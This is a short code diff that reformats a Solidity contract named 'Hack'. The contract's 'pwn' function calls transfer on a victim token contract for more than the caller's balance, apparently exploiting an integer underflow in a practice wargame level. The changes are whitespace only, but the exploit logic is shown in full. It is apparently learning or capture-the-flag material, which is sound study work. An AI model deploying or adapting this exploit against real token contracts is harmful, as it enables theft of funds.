@@ -31,12 +31,13 @@ contract Hack {
 
 constructor (address _victum) public {
    owner = msg.sender;
-  token  = IToken(_victum);
+   token  = IToken(_victum);
 }
 
 function pwn (address _to,uint _value) public {
-bool sucses = token.transfer(_to, _value + 10000000);
-require(sucses == true);
+    bool sucses = token.transfer(_to, _value + 10000000);
+    require(sucses == true);
 }
+
 
 }
